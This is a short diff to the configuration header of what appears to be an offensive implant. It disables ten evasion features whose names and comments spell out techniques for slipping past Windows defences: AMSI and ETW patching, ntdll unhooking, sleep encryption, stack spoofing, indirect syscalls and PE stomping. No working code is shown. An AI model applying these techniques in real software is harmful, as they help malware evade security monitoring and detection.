@@ -74,16 +74,16 @@ static const unsigned char CONFIG_DNS_DOMAIN_ENC[] = {0};
 #endif /* CONFIG_XOR_KEY */
 
 /* ─── Evasion toggles ─── */
-#define CONFIG_ANTI_DEBUG       1   /* 1 = check for debuggers at startup */
-#define CONFIG_ANTI_SANDBOX     1   /* 1 = check for sandbox/VM at startup */
-#define CONFIG_PATCH_AMSI       1   /* 1 = patch AmsiScanBuffer on init */
-#define CONFIG_PATCH_ETW        1   /* 1 = patch EtwEventWrite on init */
-#define CONFIG_UNHOOK_NTDLL     1   /* 1 = restore ntdll.dll .text from disk */
-#define CONFIG_SLEEP_OBFUSCATE  1   /* 1 = Ekko-style sleep encryption */
-#define CONFIG_STACK_SPOOF      1   /* 1 = spoof thread stack during sleep */
-#define CONFIG_INDIRECT_SYSCALLS 1  /* 1 = use indirect syscalls (Hell's Gate) */
-#define CONFIG_PE_STOMP         1   /* 1 = stomp PE headers after init */
-#define CONFIG_API_HASHING      1   /* 1 = resolve sensitive APIs via PEB walk + DJB2 */
+#define CONFIG_ANTI_DEBUG       0   /* 1 = check for debuggers at startup */
+#define CONFIG_ANTI_SANDBOX     0   /* 1 = check for sandbox/VM at startup */
+#define CONFIG_PATCH_AMSI       0   /* 1 = patch AmsiScanBuffer on init */
+#define CONFIG_PATCH_ETW        0   /* 1 = patch EtwEventWrite on init */
+#define CONFIG_UNHOOK_NTDLL     0   /* 1 = restore ntdll.dll .text from disk */
+#define CONFIG_SLEEP_OBFUSCATE  0   /* 1 = Ekko-style sleep encryption */
+#define CONFIG_STACK_SPOOF      0   /* 1 = spoof thread stack during sleep */
+#define CONFIG_INDIRECT_SYSCALLS 0  /* 1 = use indirect syscalls (Hell's Gate) */
+#define CONFIG_PE_STOMP         0   /* 1 = stomp PE headers after init */
+#define CONFIG_API_HASHING      0   /* 1 = resolve sensitive APIs via PEB walk + DJB2 */
 #define CONFIG_MODULE_STOMP     0   /* 1 = use module stomping for BOF .text sections */
 #define CONFIG_PHANTOM_HOLLOW   0   /* 1 = phantom DLL hollowing (superior to module stomp) */
 
